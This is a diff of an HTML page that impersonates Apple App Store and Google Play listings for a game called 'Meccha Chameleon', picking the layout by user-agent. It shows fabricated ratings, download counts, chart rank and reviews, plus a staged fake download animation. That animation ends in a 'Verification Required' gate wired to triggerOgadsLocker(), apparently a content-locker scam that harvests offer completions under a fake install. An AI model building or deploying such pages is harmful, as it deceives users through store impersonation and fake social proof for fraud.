@@ -3,172 +3,181 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meccha Chameleon on the App Store</title>
+    <title>Meccha Chameleon | Official Download</title>
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;500;600;700;800&family=SF+Pro+Text:wght@400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=SF+Pro+Display:wght@500;700;800&display=swap" rel="stylesheet">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000000; }
-        .appstore-blur { backdrop-filter: blur(20px); background-color: rgba(29, 29, 31, 0.72); }
         .no-scrollbar::-webkit-scrollbar { display: none; }
         .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
     </style>
 </head>
-<body class="text-[#f5f5f7] antialiased select-none">
+<body class="bg-black text-[#f5f5f7] antialiased select-none">
 
-    <!-- Top App Store Bar -->
-    <header class="appstore-blur sticky top-0 z-40 border-b border-[#2d2d2f]/60 px-4 py-3">
-        <div class="max-w-xl mx-auto flex items-center justify-between">
-            <div class="flex items-center gap-2">
-                <svg class="w-5 h-5 fill-current text-white" viewBox="0 0 24 24">
-                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.21.67-2.93 1.49-.62.69-1.16 1.84-1.01 2.96 1.12.09 2.27-.58 2.95-1.39z"/>
-                </svg>
-                <span class="text-xs font-semibold tracking-tight text-slate-400">App Store</span>
+    <!-- ==================== APPLE APP STORE LAYOUT ==================== -->
+    <div id="ios-layout" class="hidden">
+        <header class="backdrop-blur-md sticky top-0 z-40 border-b border-[#2d2d2f]/60 bg-black/70 px-4 py-3">
+            <div class="max-w-xl mx-auto flex items-center justify-between">
+                <div class="flex items-center gap-2">
+                    <svg class="w-5 h-5 fill-current text-white" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 4.17c.66-.81 1.11-1.93.99-3.06-1 .04-2.21.67-2.93 1.49-.62.69-1.16 1.84-1.01 2.96 1.12.09 2.27-.58 2.95-1.39z"/></svg>
+                    <span class="text-xs font-semibold tracking-tight text-slate-400">App Store</span>
+                </div>
+                <button onclick="openDownloadFlow()" class="bg-[#0071e3] text-white font-semibold px-4 py-1.5 rounded-full text-xs cursor-pointer">GET</button>
             </div>
-            <button onclick="openDownloadFlow()" class="bg-[#0071e3] hover:bg-[#147ce5] text-white font-semibold px-4 py-1.5 rounded-full text-xs tracking-wide cursor-pointer transition-all">
-                GET
-            </button>
-        </div>
-    </header>
+        </header>
 
-    <!-- Main Content Area (Mobile Optimized Layout) -->
-    <main class="max-w-xl mx-auto px-4 pt-6 pb-24 space-y-6">
-        
-        <!-- App Identity Header -->
-        <div class="flex gap-4 items-start">
-            <img src="meccha.jpg" alt="Meccha Chameleon Icon" class="w-24 h-24 sm:w-28 sm:h-28 rounded-[1.6rem] object-cover border border-[#2d2d2f] shadow-xl">
-            <div class="space-y-1 flex-1">
-                <h1 class="text-xl sm:text-2xl font-bold tracking-tight text-white leading-tight">Meccha Chameleon</h1>
-                <p class="text-xs sm:text-sm text-[#0071e3] font-medium uppercase tracking-wide">lemorion_1224</p>
-                <p class="text-xs text-[#86868b]">Paint, Blend & Survive Multiplayer</p>
-                <div class="pt-2 flex items-center gap-2">
-                    <button onclick="openDownloadFlow()" class="bg-[#0071e3] hover:bg-[#147ce5] text-white font-bold px-6 py-1.5 rounded-full text-xs tracking-wide cursor-pointer transition-all uppercase">
-                        GET
-                    </button>
-                    <span class="text-[10px] text-[#86868b]">In-App Purchases</span>
+        <main class="max-w-xl mx-auto px-4 pt-6 pb-24 space-y-6">
+            <div class="flex gap-4 items-start">
+                <img src="meccha.jpg" class="w-24 h-24 rounded-[1.6rem] object-cover border border-[#2d2d2f] shadow-xl">
+                <div class="space-y-1 flex-1">
+                    <h1 class="text-xl font-bold tracking-tight text-white">Meccha Chameleon</h1>
+                    <p class="text-xs text-[#0071e3] font-medium">lemorion_1224</p>
+                    <p class="text-xs text-[#86868b]">Paint & Blend Hide-and-Seek</p>
+                    <div class="pt-2 flex items-center gap-2">
+                        <button onclick="openDownloadFlow()" class="bg-[#0071e3] text-white font-bold px-6 py-1.5 rounded-full text-xs cursor-pointer uppercase">GET</button>
+                        <span class="text-[10px] text-[#86868b]">In-App Purchases</span>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <!-- App Store Badges Metadata Row -->
-        <div class="grid grid-cols-4 gap-1 py-3 border-t border-b border-[#2d2d2f]/60 text-center text-xs">
-            <div class="space-y-0.5 border-r border-[#2d2d2f]/40">
-                <p class="text-[#86868b] text-[10px] font-medium uppercase">Ratings</p>
-                <p class="text-[#aeaeaf] font-bold text-sm">4.9 ★</p>
+            <div class="grid grid-cols-4 gap-1 py-3 border-t border-b border-[#2d2d2f]/60 text-center text-xs">
+                <div><p class="text-[#86868b] text-[10px] uppercase">Ratings</p><p class="text-[#aeaeaf] font-bold text-sm">4.9 ★</p></div>
+                <div><p class="text-[#86868b] text-[10px] uppercase">Age</p><p class="text-[#aeaeaf] font-bold text-sm">4+</p></div>
+                <div><p class="text-[#86868b] text-[10px] uppercase">Chart</p><p class="text-[#0071e3] font-bold text-sm">#1 Casual</p></div>
+                <div><p class="text-[#86868b] text-[10px] uppercase">Size</p><p class="text-[#aeaeaf] font-bold text-sm">184 MB</p></div>
             </div>
-            <div class="space-y-0.5 border-r border-[#2d2d2f]/40">
-                <p class="text-[#86868b] text-[10px] font-medium uppercase">Age</p>
-                <p class="text-[#aeaeaf] font-bold text-sm">4+</p>
-            </div>
-            <div class="space-y-0.5 border-r border-[#2d2d2f]/40">
-                <p class="text-[#86868b] text-[10px] font-medium uppercase">Chart</p>
-                <p class="text-[#0071e3] font-bold text-sm">#1</p>
-                <p class="text-[#86868b] text-[8px] uppercase">Casual</p>
-            </div>
-            <div class="space-y-0.5">
-                <p class="text-[#86868b] text-[10px] font-medium uppercase">Size</p>
-                <p class="text-[#aeaeaf] font-bold text-sm">184 MB</p>
-            </div>
-        </div>
-
-        <!-- Screenshots Gallery -->
-        <div class="space-y-2">
-            <h3 class="text-sm font-semibold text-[#f5f5f7]">Preview</h3>
-            <div class="flex gap-3 overflow-x-auto no-scrollbar snap-x snap-mandatory">
-                <div class="w-[210px] aspect-[9/16] bg-[#1d1d1f] rounded-2xl overflow-hidden shrink-0 snap-start border border-[#2d2d2f]">
-                    <img src="meccha.jpg" class="w-full h-full object-cover" alt="Gameplay 1">
-                </div>
-                <div class="w-[210px] aspect-[9/16] bg-[#1d1d1f] rounded-2xl overflow-hidden shrink-0 snap-start border border-[#2d2d2f]">
-                    <img src="meccha.jpg" class="w-full h-full object-cover filter brightness-90 contrast-125" alt="Gameplay 2">
-                </div>
-                <div class="w-[210px] aspect-[9/16] bg-[#1d1d1f] rounded-2xl overflow-hidden shrink-0 snap-start border border-[#2d2d2f]">
-                    <img src="meccha.jpg" class="w-full h-full object-cover filter saturate-150" alt="Gameplay 3">
+            <!-- Screenshots -->
+            <div class="space-y-2">
+                <div class="flex gap-3 overflow-x-auto no-scrollbar snap-x snap-mandatory">
+                    <img src="meccha.jpg" class="w-[200px] aspect-[9/16] bg-[#1d1d1f] rounded-2xl object-cover shrink-0 snap-start border border-[#2d2d2f]">
+                    <img src="meccha.jpg" class="w-[200px] aspect-[9/16] bg-[#1d1d1f] rounded-2xl object-cover shrink-0 snap-start border border-[#2d2d2f] brightness-90">
                 </div>
             </div>
-        </div>
+            <!-- Description -->
+            <p class="text-xs sm:text-sm text-[#e8e8ed] leading-relaxed">Paint your white body to mimic the stage assets. Spot, pose, and color manipulation skill are keys to server survival.</p>
+        </main>
+    </div>
 
-        <!-- Description -->
-        <div class="space-y-2 text-xs sm:text-sm leading-relaxed text-[#e8e8ed]">
-            <p>Paint yourself to blend in. Meccha Chameleon is a new sensation hide and seek game where you paint your white body to mimic the stage assets. Spot, pose, and color manipulation skill are your keys to ultimate server survival.</p>
-        </div>
 
-        <!-- What's New Section -->
-        <div class="space-y-2 pt-2 border-t border-[#2d2d2f]/60">
-            <div class="flex justify-between items-baseline">
-                <h3 class="text-sm font-semibold text-white">What's New</h3>
-                <span class="text-xs text-[#86868b]">Version 1.0.4</span>
-            </div>
-            <p class="text-xs text-[#aeaeaf] leading-relaxed">Optimized camouflage blending matrices for mobile hardware layouts, fixed session latency bugs inside multi-player server hubs, and expanded live skin lockers.</p>
-        </div>
-
-        <!-- Genuine Looking User Reviews (Social Proof) -->
-        <div class="space-y-3 pt-2 border-t border-[#2d2d2f]/60">
-            <h3 class="text-sm font-semibold text-white">Ratings & Reviews</h3>
-            
-            <div class="bg-[#1c1c1e] p-4 rounded-xl space-y-2 border border-[#2d2d2f]/40">
-                <div class="flex justify-between items-center text-xs">
-                    <span class="font-bold text-white text-xs">Insanely Addictive!</span>
-                    <span class="text-[#86868b]">2 days ago</span>
+    <!-- ==================== GOOGLE PLAY STORE LAYOUT ==================== -->
+    <div id="android-layout" class="hidden bg-[#111] text-[#e3e3e3]">
+        <header class="bg-[#1f1f1f] px-4 py-3 border-b border-[#2d2d2d] sticky top-0 z-40">
+            <div class="max-w-xl mx-auto flex items-center justify-between">
+                <div class="flex items-center gap-3">
+                    <svg class="w-6 h-6 text-[#01875f]" viewBox="0 0 24 24" fill="currentColor"><path d="M3.609 2.164A2.32 2.32 0 0 0 3 3.75v16.5c0 .62.24 1.19.64 1.61l.1.1L15.39 12 3.75 2.064l-.14.1zM18.72 8.66l-3.33-1.92L3.74 18.39l11.65-6.39 3.33-1.92a1.48 1.48 0 0 0 0-2.56z"/></svg>
+                    <span class="font-medium text-sm text-white">Google Play</span>
                 </div>
-                <div class="text-amber-400 text-xs">★★★★★</div>
-                <p class="text-xs text-[#aeaeaf] leading-relaxed">The camouflage mechanics are perfect. Running through the dynamic maps while painting yourself to match the backdrop layout works flawlessly. Recommended!</p>
             </div>
+        </header>
 
-            <div class="bg-[#1c1c1e] p-4 rounded-xl space-y-2 border border-[#2d2d2f]/40">
-                <div class="flex justify-between items-center text-xs">
-                    <span class="font-bold text-white text-xs">Best Party Game of 2026</span>
-                    <span class="text-[#86868b]">1 week ago</span>
+        <main class="max-w-xl mx-auto px-4 pt-6 pb-24 space-y-6" style="font-family: 'Roboto', sans-serif;">
+            <div class="flex gap-5 items-start">
+                <img src="meccha.jpg" class="w-20 h-20 rounded-2xl object-cover shadow-md border border-[#333]">
+                <div class="space-y-0.5 flex-1">
+                    <h1 class="text-xl font-medium text-white tracking-wide">Meccha Chameleon</h1>
+                    <p class="text-xs text-[#01875f] font-semibold">lemorion_1224</p>
+                    <p class="text-xs text-[#9aa0a6]">Contains ads · In-app purchases</p>
                 </div>
-                <div class="text-amber-400 text-xs">★★★★★</div>
-                <p class="text-xs text-[#aeaeaf] leading-relaxed">Runs very smooth on my device. Finding the hidden chameleons is super challenging when they execute high level paint skills.</p>
             </div>
+
+            <!-- Install Button Google Play Style -->
+            <div class="pt-1">
+                <button onclick="openDownloadFlow()" class="w-full bg-[#01875f] hover:bg-[#017250] text-black font-semibold py-2.5 rounded-full text-sm cursor-pointer transition-all text-center">
+                    Install
+                </button>
+            </div>
+
+            <!-- Play Badges -->
+            <div class="flex justify-between text-center text-xs text-[#9aa0a6] py-2 border-b border-[#2d2d2d]">
+                <div class="flex-1 border-r border-[#2d2d2d]"><p class="text-white font-bold text-sm">4.9 ★</p><p class="text-[10px]">142K reviews</p></div>
+                <div class="flex-1 border-r border-[#2d2d2d]"><p class="text-white font-bold text-sm">5M+</p><p class="text-[10px]">Downloads</p></div>
+                <div class="flex-1"><p class="text-white font-bold text-sm">Rated 3+</p><p class="text-[10px]">Everyone</p></div>
+            </div>
+
+            <!-- Screenshots -->
+            <div class="flex gap-2 overflow-x-auto no-scrollbar">
+                <img src="meccha.jpg" class="w-[240px] aspect-video rounded-xl object-cover shrink-0 border border-[#333]">
+                <img src="meccha.jpg" class="w-[240px] aspect-video rounded-xl object-cover shrink-0 border border-[#333] brightness-90">
+            </div>
+
+            <div class="space-y-1">
+                <h3 class="text-sm font-medium text-white">About this game</h3>
+                <p class="text-xs text-[#9aa0a6] leading-relaxed">Paint yourself to blend in. Survival requires maximum camouflage and artistic skills in multiplayer lobbies.</p>
+            </div>
+        </main>
+    </div>
+
+
+    <!-- ==================== RATINGS & REVIEWS (SHARED) ==================== -->
+    <section class="max-w-xl mx-auto px-4 pb-20 -mt-16 space-y-3">
+        <div class="bg-[#1c1c1e] p-4 rounded-xl space-y-2 border border-[#2d2d2f]/40">
+            <div class="flex justify-between text-xs text-[#86868b]">
+                <span class="font-bold text-white">Insanely Addictive!</span>
+                <span>2 days ago</span>
+            </div>
+            <div class="text-amber-400 text-xs">★★★★★</div>
+            <p class="text-xs text-[#aeaeaf] leading-relaxed">The camouflage mechanics are perfect. Running through the dynamic maps while painting yourself works flawlessly.</p>
         </div>
+    </section>
 
-    </main>
 
-    <!-- iOS Simulation Downloader Overlay (Locker Interface) -->
+    <!-- ==================== UNIVERSAL OVERLAY MODAL ==================== -->
     <div id="flowModal" class="hidden fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4 backdrop-blur-md">
-        <div class="bg-[#1c1c1e] border border-[#2d2d2f] w-full max-w-sm rounded-2xl p-5 text-center relative shadow-2xl space-y-5">
+        <div class="bg-[#1c1c1e] border border-[#2d2d2f] w-full max-w-sm rounded-2xl p-5 text-center relative space-y-5">
             
-            <button onclick="closeDownloadFlow()" class="absolute top-4 right-4 text-slate-500 hover:text-white font-medium text-xs cursor-pointer">Cancel</button>
+            <button onclick="closeDownloadFlow()" class="absolute top-4 right-4 text-slate-500 hover:text-white text-xs cursor-pointer">Cancel</button>
 
-            <!-- Loading Circle Build -->
+            <!-- Loading Simulation -->
             <div id="step-loading" class="space-y-4 pt-4">
-                <div class="w-10 h-10 border-2 border-t-transparent border-[#0071e3] rounded-full animate-spin mx-auto"></div>
+                <div class="w-9 h-9 border-2 border-t-transparent id-loader rounded-full animate-spin mx-auto"></div>
                 <div class="space-y-1">
-                    <h4 id="loading-status" class="text-sm font-semibold text-white">Connecting App Store Server...</h4>
+                    <h4 id="loading-status" class="text-sm font-semibold text-white">Processing Request...</h4>
                     <p id="progress-text" class="text-xs font-mono text-[#86868b]">0%</p>
                 </div>
             </div>
 
-            <!-- Content Locker Execution Trigger -->
+            <!-- Content Locker Point -->
             <div id="step-verify" class="hidden space-y-5 pt-2">
-                <div class="w-12 h-12 bg-[#0071e3]/10 text-[#0071e3] border border-[#0071e3]/30 rounded-full flex items-center justify-center text-xl mx-auto font-bold">
-                    i
-                </div>
-                
+                <div class="w-12 h-12 bg-blue-500/10 text-blue-400 border border-blue-500/30 rounded-full flex items-center justify-center text-xl mx-auto font-bold">i</div>
                 <div class="space-y-1.5">
                     <h3 class="text-white font-bold text-base">Verification Required</h3>
                     <p class="text-[#aeaeaf] text-xs px-2 leading-relaxed">
-                        To finalize the secure cryptographic asset bundle extraction and install **Meccha Chameleon**, please complete a quick device verification.
+                        To bypass malicious bot traffic and complete the secure game client download, please complete the device verification step below.
                     </p>
                 </div>
-
-                <div class="pt-2">
-                    <button onclick="triggerOgadsLocker()" class="cursor-pointer block w-full text-center font-semibold text-white bg-[#0071e3] hover:bg-[#147ce5] py-3 rounded-xl text-xs tracking-wide transition-all shadow-md">
+                <div class="pt-1">
+                    <button onclick="triggerOgadsLocker()" class="cursor-pointer block w-full text-center font-semibold text-white id-btn py-3 rounded-xl text-xs tracking-wide transition-all shadow-md">
                         Complete Verification
                     </button>
                 </div>
-
-                <p class="text-[9px] text-[#86868b] font-mono uppercase tracking-wider">Device Secure Token Signature Handshake Pending</p>
+                <p class="text-[9px] text-[#86868b] font-mono uppercase tracking-wider">Secure Client Handshake Status: Pending</p>
             </div>
 
         </div>
     </div>
 
-    <!-- Script Routing System -->
+
+    <!-- ==================== DETECTOR SCRIPT ==================== -->
     <script>
+        // Detection Logic for iOS / Android Layouts
+        window.addEventListener('DOMContentLoaded', () => {
+            const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+            
+            if (isIOS) {
+                document.getElementById('ios-layout').classList.remove('hidden');
+                document.querySelector('.id-loader').style.borderColor = '#0071e3';
+                document.querySelector('.id-loader').style.borderTopColor = 'transparent';
+                document.querySelector('.id-btn').style.backgroundColor = '#0071e3';
+            } else {
+                document.getElementById('android-layout').classList.remove('hidden');
+                document.querySelector('.id-loader').style.borderColor = '#01875f';
+                document.querySelector('.id-loader').style.borderTopColor = 'transparent';
+                document.querySelector('.id-btn').style.backgroundColor = '#01875f';
+            }
+        });
+
         function openDownloadFlow() {
             document.getElementById('flowModal').classList.remove('hidden');
             document.getElementById('step-loading').classList.remove('hidden');
@@ -179,10 +188,10 @@
             const loadingStatus = document.getElementById('loading-status');
 
             const logs = [
-                "Fetching payload build...",
-                "Verifying device signature...",
-                "Assembling installation package...",
-                "Verification loop requested..."
+                "Securing App Store tunnel...",
+                "Analyzing device signature...",
+                "Compiling game assets...",
+                "Handshake requested..."
             ];
 
             const interval = setInterval(() => {
@@ -199,7 +208,7 @@
                     document.getElementById('step-loading').classList.add('hidden');
                     document.getElementById('step-verify').classList.remove('hidden');
                 }
-            }, 40);
+            }, 30);
         }
 
         function closeDownloadFlow() {
